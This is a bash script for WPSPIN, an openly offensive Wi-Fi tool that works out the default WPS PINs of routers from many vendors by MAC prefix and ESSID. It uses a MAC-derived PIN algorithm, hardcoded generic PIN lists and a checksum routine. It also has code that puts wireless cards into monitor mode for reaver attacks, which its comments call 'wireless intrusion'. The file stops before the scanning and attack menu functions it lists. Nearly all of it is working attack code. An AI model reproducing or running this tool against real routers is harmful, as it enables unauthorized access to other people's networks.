#!/bin/bash
# This scripts is edited under the General Public License as defined by the Free software foundation. 
# This package is distributed in the hope that it will be useful, but without any warranty; It can be used and modified and shared but should be referenced to, it CANNOT be 
# sold or be used for a commercial-economical purpose.
# See the details in the file LICENCE.txt that is situated in the folder of the script or visit http://gplv3.fsf.org/ ) 
# The discovery of One algorithm used in WPSPIN have been made parallely and previously by zhaochunsheng in a C. script named computepinC83A35. as i don't known C or
# programming and found this out after coding the first version of WPS, this bash script doesn't use a dingle line of computepinC83A35.
# But it had to be saved that zhaochunsheng found the main algorithm on Chinese access points months before I found it on a new Belkin N router, without knowing it works.
# The page of the author is sadly down and i cannot link you to a straight source
# This code wouldn't have been possible with the help and advices of antares_145, r00tnuLL and 1camaron1, thanks to them billion a billion time :)  
# It wouldn't have been possible neither without my beloved lampiweb.com work crew, maripuri, bentosouto, dirneet, betis-jesus, compota, errboricobueno, pinty_102 nad all users 
# greetings to crack-wifi.com familly, yasmine, M1ck3y, spawn, goliate, fuji, antares has been already credited, koala, noireaude, vances1, konik etc... and all users
# greetings to auditoriaswireless.net and thanks to the big chief papones for the hosting and greetings to everybody
# This code uses wps reaver that has to be installed on it own, reaver is a free software (http://code.google.com/p/reaver-wps/) (GPL2) by Tactical Network Solutions. Thanks to 
# them for this amazing work
# You also need aircrack-ng, thanks to Mister X and kevin devine for providing the best suite ever (http://www.aircrack-ng.org/)
# I would like also to thanks Stefan Viehbock for all is amazing work on wps (http://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/)  
# 1.1 (10-12-2012)
#	- Support for PIN beginning with one or several 0 thanks to the data of atim and tresal. 
#	- New MAC supported : 6A:C0:6F (HG566 default ESSID vodafoneXXXX )
# 1.2 (12/12/2012)
#	- Fixed output bugs in backtrack and other distributions
#	- Added support to the generic default PIN known
# 1.3 (23/01/2013)
#	- New supported devices:
#		- 7 bSSID vodafoneXXXX (HG566a) > 6A:3D:FF / 6A:A8:E4 / 6A:C0:6F / 6A:D1:67 / 72:A8:E4 / 72:3D:FF / 72:53:D4
#		- 2 bSSID WLAN_XXXX (PDG-A4001N de adbroadband) > 74:88:8B / A4:52:6F
#		- 2 new models affected:
#			1) SWL (Samsung Wireless Link), default ESSID SEC_ LinkShare_XXXXXX.  2 known affected BSSID > 80:1F:02 / E4:7C:F9
#			2) Conceptronic  c300brs4a  (default ESSID C300BRS4A ) 1 BSSID known  > 00:22:F7   
#	- Rules to check the validity of the mac address (thanks r00tnuLL and anteres_145 for your codes) 
#	- More filter for some case where several default ssid are possible,check the difference between ssid and bssid for FTE for possibles mismatch...
#       - More information displayed when a target is selected
#	- Display and colours problems are definitively solved for all distributions, one version
#	- Rewriting of code (tanks to r00tnuLL, antares_145, goyfilms and 1camron1 for their advices and feed back)
# 1.4 ( 22/05/2013)
#      - Complete Rewriting of code to provide new functions:
#          - Multi language         
#          - A automated mode using wash and reaver 
#          - Interfaces management (automatic if only one interface is present, acting as filter if no mode monitor is possible to reduce options) 
#          - New supported bssid
#              -  2 news bssid for FTE-XXXX (HG532c)   34:6B:D3 and F8:3D:FF 
#              -  16 new bssid for vodafone HG566a
#               62:23:3D 62:3C:E4 62:3D:FF 62:55:9C 62:7D:5E 62:B6:86 62:C7:14 6A:23:3D 6A:3D:FF 6A:7D:5E 6A:C6:1F 6A:D1:5E 72:53:D4 72:55:9C 72:6B:D3  72:A8:E4  
#          - New supported devices ( 9 models )    
#              -  TP-LINK  >  TD-W8961ND v2.1 default SSID TP-LINK_XXXXXX  3 known bssids ; F8:D1:11 B0:48:7A 64:70:02
#              -  EDIMAX  >  3G-6200n and EDIMAX  >  3G-6210n    bssid ; 00:1F:1F defaukt SSID : default
#              -  KOZUMI >  K1500 and   K1550  bssid : 00:26:CE 
#              -  Zyxel  >  P-870HNU-51B      bssid : FC:F5:28
#              -  TP-LINK  TP-LINK_XXXXXX  TL-WA7510N    bssid : 90:F6:52:
#              -  SAGEM FAST 1704 > SAGEM_XXXX    bssid :  7C:D3:4C:

##################################### COLORS

colorbase="\E[0m"                      # We define the colors as variables to avoid problems of output from one distribution to the other 
azulfluo="\033[1;36m"           
amarillo="\033[1;33m"
rojo="\033[1;31m"
blanco="\033[1;37m"
verde="\033[0;32m"
orange="\033[0;33m"
azul="\033[0;34m"
magenta="\033[1;35m"
negro="\033[0;30m"
gris="\033[1;30m"
verdefluo="\033[1;32m"
clignote='\e[1;5m'



###############################          FUNCTIONS          ###########################################################################################

###############################  FIRST THE ONE THAT ARE COMMON TO EVERY LANGUAGE (NO DISPLAY INVOLVED) ##################################################

##############################  I    > GENERATE - TO ATTRIBUTE PIN AND DATAS TO AP
############################### II   > CHECKSUM (by antares_145 ) - CALCULATE THE WPS CHECKSUM
############################### III  > ZAOMODE - APLLYING THE SAME ALGORITHM THAN ZHAOCHUNSHENG IN COMPUTEPIN
############################### IV   > IFACE - MANAGE INTERFACES FOR WIRELESS INTRUSION AND LIMIT USER TO SHORT MENUE IF NO INTERFACE IS AVAILABLE
############################### V    > IFACE_SELECTION - FOR SELECTING THE INTERFACE IF SEVERAL ARE AVALAIBLES
############################### VI   > WASH_SCAN - LAUNCH WPS SCANNING REORGANIZING THE OUPUT DISPLY (use wash form reaver)
############################### VII  > REAVER_CHECK - CONTROL IF REAVER IS INSTALLED (ALSO CHECK IF WASH OR WALSH IS USED)
############################### VIII > BIG_MENUE - WPSPIN WITH ALL FEATURES  
############################### IX   > CLEAN - REMOVE TMP FILES AND UNSET THE VARIABLES
  





###################   GENERATE ######################################################################################################################################
################################################## the core of script, attribute a default PIN to the routers 

###### VARIABLES CODIFIED          ACTIVATED >  1 = YES  0 = NO           SPECIAL > 1 = SEVERAL MODEL WITH THIS BSSID      2 = WPS AP RATE LIMIT ############################
###############################    UNKNOWN   >  0 = NO      1 = YES




GENERATE(){                                                                  # this functions will attribute a default PIN number according to the bssid and in some cases bssid 
                                                                             # and essid, we need at least to have defined a variable BSSID (the mac address of the objective


UNKNOWN=0                                                                    # By default routers are  marked as supported with 0, when there are not this value will be changed
SPECIAL=0

CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')                   # we take pout the 6 first half of the mac address (to identify the devices=  
FINBSSID=$(echo $BSSID | cut -d ':' -f4,5,6)                                 # we keep the other half to generate the PIN
MAC=$(echo $FINBSSID | tr -d ':')                                            # taking away the ":" 
CONVERTEDMAC=$(printf '%d\n' 0x$MAC)                                         # conversion to decimal

case $CHECKBSSID in                                                          # we will check the beginning of the mac to identify the AP


04C06F | 202BC1 | 285FDB | 346BD3 | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0 | F83DFF)    # For FTE-XXXX (HG552c), original algorithm by kcdtv  
FINESSID=$(echo $ESSID | cut -d '-' -f2)                                     # We take the identifier of the essid with cut
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')                       # we take digit 7 and 8 of the mac address
CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')                     # we isolate the digits 9 to 12 to check the conformity of the default difference BSSID - ESSID
if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&   [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];  
       
then
MACESSID=$(echo $PAREMAC$FINESSID)                                           # this is the string used 7 and 8 digits mac + 4 last digits essid FTE-XXXX 
STRING=`expr $(printf '%d\n' 0x$MACESSID) '+' 7`                             # we had 7 to the string

CHECKSUM

  else                                                                       # if essid is not the default one we will generate the three possible PIN according to the mac 
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 8`                     # mac + 8 converted to decimal = our PIN2

  CHECKSUM

  PIN2=$PIN
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 14`                    # mac + 14 converted to decimal = our PIN3

  CHECKSUM

  PIN3=$PIN                                           

  ZAOMODE                                                                    # PIN number one we use the first algorithm, end mac converted to decimal 

  CHECKSUM

fi

FABRICANTE="HUAWEI"                             ##### FTE-XXXX HUAWEI HG532c Echo Life  > algorithm kcdtv
DEFAULTSSID="FTE-XXXX"
MODEL="HG532c Echo Life"
ACTIVATED=1


;;
001915 )                                        ##### WLAN-XXXX TECOM  AW4062   > generic 12345670

PIN=12345670

FABRICANTE="OBSERVA TELECOM"
DEFAULTSSID="WLAN_XXXX"
MODEL="AW4062"
ACTIVATED=0                                    # 0 is given to the routers that does not't have WPS enabled


;;
F43E61 | 001FA4)                               ####### WLAN_XXXX  OEM Shenzhen Gongjin Electronics   Encore ENDSL-4R5G   > Generic 12345670

PIN=12345670

FABRICANTE="OEM Shenzhen Gongjin Electronics"
DEFAULTSSID="WLAN_XXXX"
MODEL="Encore ENDSL-4R5G"
ACTIVATED=1                                    # 1 and the wps is activated



;;
404A03)                                      ######## WLAN_XXXX P-870HW-51A V2  ZYXELL    > Generic 11866428

PIN=11866428

FABRICANTE="ZYXELL"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HW-51A V2"
ACTIVATED=1

;;
001A2B)                                     ######## WLAN_XXXX Gigabyte 802.11n by Comtrend      >Generic 88478760 

PIN=88478760                                # comtrend has others models with this mac for the moment we will give this PIN for all devices warning the user about it 

FABRICANTE="Comtrend"
DEFAULTSSID="WLAN_XXXX"
MODEL="Gigabit 802.11n"
ACTIVATED=1
SPECIAL=2                                 # 2 when different models with different PIN have the same start of bssid

;;
3872C0)                                   # ######## JAZZTEL_XXXX AR-5387un  Comtrend   > Generic 18836486 20172527

PIN=18836486                              # same story, some of this range mac address are used by Telefonica (WLAN_XXXX) in this case there is not even wps, we let it this way
PIN2=20172527

FABRICANTE="Comtrend"
DEFAULTSSID="JAZZTEL_XXXX"
MODEL="AR-5387un"
ACTIVATED=0
SPECIAL=2            

;;
FCF528)                                   ######### WLAN_XXXX P-870HNU-51B by ZYXELL  > Generic 20329761

PIN=20329761                           

FABRICANTE="ZYXELL"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HNU-51B"
ACTIVATED=1
SPECIAL=1

;;
3039F2)                          ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
74888B)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=43297917
PIN2=73767053
PIN3=88202907
PIN4=16538061
PIN5=16702738
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
A4526F)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=88202907
PIN3=73767053 
PIN4=16702738
PIN5=43297917
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1
 
;;
DC0B1A)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
5C4CA9 | 62233D | 623CE4 | 623DFF | 62559C | 627D5E | 62A8E4 | 62B686 | 62C06F | 62C61F | 62C714 | 62E87B | 6A233D | 6A3DFF | 6A53D4 | 6A559C | 6A6BD3 | 6A7D5E | 6AA8E4 | 6AC06F | 6AC61F | 6AC714 | 6AD15E | 6AD167 | 723DFF | 7253D4 | 72559C | 726BD3 | 727D5E | 72A8E4 | 72C06F | 72C714 | 72D15E | 72E87B )   

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"         ############# HUAWEI HG 566a vodafoneXXXX > Pin algo zao
DEFAULTSSID="vodafoneXXXX"
MODEL="HG 566a"
ACTIVATED=1

;;
002275)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin Belkin_N+_XXXXXX  F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="Belkin_N+_XXXXXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
08863B)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="belkin.XXX"
MODEL="F9K1104(N900 DB Wireless N+ Router)"
ACTIVATED=1


;;
001CDF)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="belkin.XXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
00A026)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Teldat"         ############# Teldat WLAN_XXXX iRouter1104-W  > Pin algo zao
DEFAULTSSID="WLAN_XXXX"
MODEL="iRouter1104-W"
ACTIVATED=1


;;
5057F0)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Zyxel"         ############# Zyxel ZyXEL zyxel NBG-419n  > Pin algo zao
DEFAULTSSID="ZyXEL"
MODEL="zyxel NBG-419n"
ACTIVATED=1


;;
C83A35 | 00B00C | 081075)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Tenda"         ############# Tenda W309R  > Pin algo zao, original router that was used by ZaoChuseng to reveal the security breach
DEFAULTSSID="cf. computepinC83A35"
MODEL="W309R"
ACTIVATED=1

;;
E47CF9 | 801F02)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="SAMSUNG"         ############# SAMSUNG   SEC_ LinkShare_XXXXXX  SWL (Samsung Wireless Link)  > Pin algo zao
DEFAULTSSID="SEC_ LinkShare_XXXXXX"
MODEL="SWL (Samsung Wireless Link)"
ACTIVATED=1

;;
0022F7)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Conceptronic"         ############# CONCEPTRONIC   C300BRS4A  c300brs4a  > Pin algo zao
DEFAULTSSID="C300BRS4A"
MODEL="c300brs4a"
ACTIVATED=1

       
;;                                 ########### NEW DEVICES SUPPORTED FOR VERSION 1.5 XD
F8D111 | B0487A | 647002 )              

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK  TD-W8961ND v2.1   > Pin algo zao
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TD-W8961ND v2.1"
ACTIVATED=1
SPECIAL=2


;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n"
ACTIVATED=1


;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n/3G-6210n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n & 3G-6210n"
ACTIVATED=1

;;
0026CE)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="KUZOMI"              ########## KUZOMI K1500 & K1550 "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="K1500 & K1550"
ACTIVATED=1


;;
90F652)

PIN=12345670

FABRICANTE="TP-LINK"            ########## TP-LINK  TP-LINK_XXXXXX  TL-WA7510N  > PIN   generic 12345670
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TL-WA7510N"
ACTIVATED=1


;;
7CD34C)                        ########### SAGEM FAST 1704    > PIN GENERIC 43944552

PIN=43944552

FABRICANTE="SAGEM"
DEFAULTSSID="SAGEM_XXXX"
MODEL="fast 1704"
ACTIVATED=1


;;
000CC3)                               ########### BEWAN, two defaukt ssid abd two default PIN ELE2BOX_XXXX > 47392717   Darty box ; 12345670

if [[ $ESSID =~ ^TELE2BOX_[[:xdigit:]]{4}[[:blank:]]*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
SPECIAL=2
PIN=47392717


elif  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then


FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX / DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
SPECIAL=2
PIN=47392717
PIN2=12345670

fi





;;
*)                        # for everything alese, the first algorythm by zhaochunsheng  
if  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then  # case of the darty box that can broadcast bssid without any relation to the device real mac


FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else
ZAOMODE                                                                   
CHECKSUM                                                                     

UNKNOWN=1                 # this value 1 will identify the routeurs has unknown


fi
;;
esac
}



################################################################################################ END GENERATE ################ FOR attributing the default PIN #################
#####################################################################################################









CHECKSUM(){                                                                  # The function checksum was written for bash by antres_145 form crack-wifi.com
PIN=`expr 10 '*' $STRING`                                                    # We will have to define first the string $STRING (the 7 first number of the WPS PIN)
ACCUM=0                                                                      # to get a result using this function)
                                                             
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`       # multiplying the first number by 3, the second by 1, the third by 3 etc....
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`             # so we follow the pattern for our seven number

DIGIT=`expr $ACCUM '%' 10`                                                   # we define our digit control: the sum reduced with base 10 to the unit number
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`                                 # the cheksum is equal to " 10 minus  digit control "

PIN=$(printf '%08d\n' `expr $PIN '+' $CHECKSUM`)                             # Some zero-pading in case that the value of the PIN is under 10000000   
}                                                                            # STRING + CHECKSUM gives the fulll WPS PIN




ZAOMODE(){                                                                   # this is the string (half mac converted to decimal) used in the algorithm originally discovered by
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`                             # zhaochunsheng in ComputePIN                                            
}




IFACE(){                                                                     # For reaver and wash/wealsh  we will need a mode monitor interface so this functions will deal
                                                                             #with the task to assign one, that will be declared as MON_ATTACK






                                                                             # this function will check if there is any wireless device recognized by he system
iw dev | grep Interface >  /tmp/Interface.txt                                # if there is not, the user will be directed to short menu where no scan or wireless attack
 declare -a INTERFACE                                                        #  ar allowed So we grep the information of iw dev in a text file 
 declare -a WLANX                                                            # declare 3 arrays, one for the total interfaces, one for the wlan and the other for mon
 declare -a MONX
  for i in 'INTERFACE' 'WLANX'  'MONX' ;
  do 
  count=1                
    if [ "$i" == "INTERFACE" ]; then
      while read -r line; do                                                 # read line by line the output  
      INTERFACE[${count}]="$line"
      count=$((count+1))                                                     # counting lines form one to one
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }')           # we grap the second field with awk to fill the array for total interface
    elif [ "$i" == "WLANX" ]; then                                           # the the same but with "grep" wlan to select the moda managed interfaces
      while read -r line; do
      WLANX[${count}]="$line"
      count=$((count+1))  
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }' | grep wlan )
    elif [ "$i" == "MONX" ]; then                                            # The same with the mon interfaces
      while read -r line; do
      MONX[${count}]="$line"
      count=$((count+1)) 
      done < <( cat /tmp/Interface.txt | awk -F' ' '{ print $2 }' | grep mon )
    fi    
 done
rm /tmp/Interface.txt &> /dev/null                                           # we erase the temporary text
IW_INTERFACE=$(echo ${#INTERFACE[@]})                                        # this is just to make a basic control of chipset and interface 
IW_WLANX=$(echo ${#WLANX[@]})
IW_MONX=$(echo ${#MONX[@]})
  
 if [ "$IW_INTERFACE" == 0 ]; then                                          # if no wireless device is detected, the script will be limited to a "Short menue" where
 
SORTMENUE_WARNING="$NO_MONITOR_MODE"                                         # no scan or attack


SHORTMENUE ############################################################ to be redacted according to the language ######################################################
  
  
 fi


sudo airmon-ng | sed '1,4d' | sed '$d' > /tmp/airmon.txt        # with sed and airmon-ng we take out the interesting information of airmon-ng command
declare -a MON_INTERFACE                                                      # one array for the chipset and one array for the interface   
declare -a MON_CHIPSET
for i in 'MON_INTERFACE' 'MON_CHIPSET';                                       # we links the values of te arrays with i
do 
 count=1                                                                      # we start from one             
  if [ "$i" == "MON_INTERFACE" ]; then                                        # we start with the array for the mode monitor capable interfaces
      while read -r line; do                                                  # we read the ouput of airmon-ng line by line and give a value to each line
      MON_INTERFACE[${count}]="$line"                                         # a value to each line 
      count=$((count+1))                                                      # and count one by one
      done < <( cat /tmp/airmon.txt | awk -F' ' '{ print $1 }')               # we take the first field that is wlanX or monX in airmon-ng display 
  elif [ "$i" == "MON_CHIPSET" ]; then                                        # The same for the chipset of the interface
      while read -r line; do
      MON_CHIPSET[${count}]="$line"
      count=$((count+1)) 
      done < <( cat /tmp/airmon.txt | awk -F' ' '{ print $2 $3 }' )                             
   fi    
done
rm /tmp/airmon.txt &> /dev/null
AIRMON_INTERFACE=$(echo ${#MON_INTERFACE[@]}) 
AIRMON_CHIPSET=$(echo ${#MON_CHIPSET[@]})
BAD_CHIPSET=$( echo "${MON_CHIPSET[1]}" | grep Unknown)



if [ "$AIRMON_INTERFACE" == 0 ]; then                                         #if no mode monitor interface is detected we will remain in short menu )no wash and no reaver)
 
SORTMENUE_WARNING="$NO_MONITOR_MODE"
 
 SHORTMENUE                                                      ###################################### change according to selected language################################

elif [ "$IW_WLANX" == 1 ] && [ -n "${BAD_CHIPSET}" ]   ; then         # if the only chipset is unknown by airmon-ng

  echo "$MON_ADVERTENCIA"                                                     ################ defined according to language ###########################
  sleep 8
  sudo ifconfig $(echo "${MON_INTERFACE[1]}") down
  MON_ATTACK=$( sudo airmon-ng start $(echo "${MON_INTERFACE[1]}") | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' )  # we activate mode monitor
  sudo ifconfig $(echo "${MON_INTERFACE[1]}") down
fi

if [ "$AIRMON_INTERFACE" == 1 ] && [ "$IW_INTERFACE" == 1 ]    ; then         # if there is just one interface and no mode monitor interface, this single interface
 sudo ifconfig $(echo "${MON_INTERFACE[1]}") down
  MON_ATTACK=$( sudo airmon-ng start $(echo "${MON_INTERFACE[1]}") | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' )  # we activate mode monitor automatically
  RT_CHECK=$( echo "${MON_CHIPSET[1]}" | grep RalinkRT2870)                  # filter for rt3070 that associate better if wlan is up
   if [ -n "${RT_CHECK}" ]; then
     sudo ifconfig $(echo "${WLANX[1]}") up
   else
     sudo ifconfig $(echo "${WLANX[1]}") down
   fi
elif [ "$AIRMON_INTERFACE" == 2 ] && [ "$IW_INTERFACE" == 2 ] && [ "$IW_MONX" == 1 ] ; then   # if there is one wlan and one mon the mon will be automatically selected 
  MON_ATTACK=$(echo "${MONX[1]}")
   RT_CHECK=$( echo "${MON_CHIPSET[1]}" | grep RalinkRT2870)                  # filter for rt3070 that associate better if wlan is up
   if [ -n "${RT_CHECK}" ]; then
     sudo ifconfig $(echo "${WLANX[1]}") up
   else
     sudo ifconfig $(echo "${WLANX[1]}") down
   fi
fi


if [ "$MON_ATTACK" == "" ] && [ "$IW_MONX" == 0 ]; then                        # If there is no interface in monitor mode detected      
  while [ "$MON_ATTACK" == "" ]; do                                            # Until an interface hasn't been properly chosen 
  
    echo "$INTERFACEDESIGN"                                                         ########################## modified according to the selected language #################
  
     for i in ${!MON_INTERFACE[*]}; do                                         # the user will be prompt to choose between interfaces with mode monitor compatibility
       CHIPSET_REDLIST=$(echo ${MON_CHIPSET[${i}]} | grep Unknown )
         if [ -n "${CHIPSET_REDLIST}" ]; then
           CHIPSET_DISPLAY=$( echo -e "$rojo${MON_CHIPSET[${i}]})$colorbase")
         else 
           CHIPSET_DISPLAY=$( echo "${MON_CHIPSET[${i}]}" ) 
         fi
       CHECK_MON_INTERFACE=$(echo ${MON_INTERFACE[${i}]})
       if [ "$CHECK_MON_INTERFACE" = "wlan0" ] || [ "$CHECK_MON_INTERFACE" = "wlan1" ] || [ "$CHECK_MON_INTERFACE" = "wlan2" ] || [ "$CHECK_MON_INTERFACE" = "wlan3" ]|| [ "$CHECK_MON_INTERFACE" = "wlan4" ]|| [ "$CHECK_MON_INTERFACE" = "wlan5" ]|| [ "$CHECK_MON_INTERFACE" = "wlan6" ]|| [ "$CHECK_MON_INTERFACE" = "wlan7" ]|| [ "$CHECK_MON_INTERFACE" = "wlan8" ]|| [ "$CHECK_MON_INTERFACE" = "wlan9" ]; then
         echo -e "                       $amarillo$i$blanco          ${MON_INTERFACE[${i}]}       $CHIPSET_DISPLAY $colorbase"              # displayed with this for loop
       else
         echo -e "                       $amarillo$i$blanco          ${MON_INTERFACE[${i}]}        $CHIPSET_DISPLAY $colorbase"  
       fi  
 
    done
  echo ""
  echo -e "    $colorbase          ---------------------------------------------------"
  echo ""  

  

 
  SELECT_THEIFACE                            ############################ modified according to the languge ###########################
  
  sudo ifconfig $(echo ${MON_INTERFACE[${i}]}) down                             # We bring down the interface
  MON_ATTACK=$( sudo airmon-ng start $(echo ${MON_INTERFACE[${i}]}) | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' )    # We start modemonitor                    
  RT_CHECK=$(echo ${MON_CHIPSET[${i}]} | grep RalinkRT2870 )                  # filter for rt3070 that associate better if wlan is up
   if [ -n "${RT_CHECK}" ]; then
     sudo ifconfig $(echo ${MON_INTERFACE[${i}]}) up
   else
      sudo ifconfig $(echo ${MON_INTERFACE[${i}]}) down
   fi
  
  done
fi




IFACE_SELECTION(){                                           ################################ IFACE SELECTION ##################################################

while [ "$MON_ATTACK" == "" ]; do                                            # at the end of iface we call this function to select an interface for reaver and wash
  
  echo "$INTERFACEDESIGN"                                                         ########################## modified according to the selected language #################
  
  for i in ${!MON_INTERFACE[*]}; do                                          # we display the available interface 
   
CHECK_MON_INTERFACE=$(echo ${MON_INTERFACE[${i}]})

     if [ "$CHECK_MON_INTERFACE" = "wlan0" ] || [ "$CHECK_MON_INTERFACE" = "wlan1" ] || [ "$CHECK_MON_INTERFACE" = "wlan2" ] || [ "$CHECK_MON_INTERFACE" = "wlan3" ]|| [ "$CHECK_MON_INTERFACE" = "wlan4" ]|| [ "$CHECK_MON_INTERFACE" = "wlan5" ]|| [ "$CHECK_MON_INTERFACE" = "wlan6" ]|| [ "$CHECK_MON_INTERFACE" = "wlan7" ]|| [ "$CHECK_MON_INTERFACE" = "wlan8" ]|| [ "$CHECK_MON_INTERFACE" = "wlan9" ]; then
       echo -e "                       $amarillo$i$blanco          ${MON_INTERFACE[${i}]}       ${MON_CHIPSET[${i}]} $colorbase"              # displayed with this for loop
       else
         echo -e "                       $amarillo$i$blanco          ${MON_INTERFACE[${i}]}        ${MON_CHIPSET[${i}]} $colorbase"  
       fi  


  done
  echo ""
  echo -e "    $colorbase          ---------------------------------------------------"
  echo ""

SELECT_THEIFACE                            ############################ modified according to the languge ###########################

CHOIX=$( echo " ${MON_INTERFACE[${i}]} ")                                 #CHOIX is the chosen interface by the user

  if [ "$CHOIX" == "" ]; then 
   IFACE_SELECTION                                                        # recursively calling the function in case the user made a mistake to re-enter datas
  fi
MONITORIZED=$( echo "$CHOIX" | grep mon )                                   # in case the interface is in mode monitor we create monotorized

  if [ "$MONITORIZED"  == "" ]; then                                        # if monotorized is empty it means the ethX or wlanX has to be put into monitor mode
    sudo ifconfig $CHOIX down                                               # we bring the interface down
    MON_ATTACK=$( sudo airmon-ng start $CHOIX | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' )  # we activate mode monitor an in the meanwhile we grap the 
     RT_CHECK=$( echo ${MON_CHIPSET[${i}]} | grep RalinkRT2870 )                  # filter for rt3070 that associate better if wlan is up
     if [ -n "${RT_CHECK}" ]; then
       sudo ifconfig $(echo ${MON_INTERFACE[${i}]}) up
     else
      sudo ifconfig $(echo ${MON_INTERFACE[${i}]}) down
     fi 
                                                # identifier of the interface, then we ensure disconexion
  else
  MON_ATTACK="$CHOIX"  
       
  fi                                                                           # check & disconnect function
done
}

IFACE_SELECTION                                                

CHIPSET_CHECK=$( (echo ${MON_CHIPSET[${i}]}) | grep Unknown )                # last we check if the chipset is unknown and will display a warning if it is true

if [ -n "${CHIPSET_CHECK}" ]; then                                           # if the variableis full then it means ythat chipset is unknown            

echo "$AIRMON_WARNING"
sleep 8

fi

}













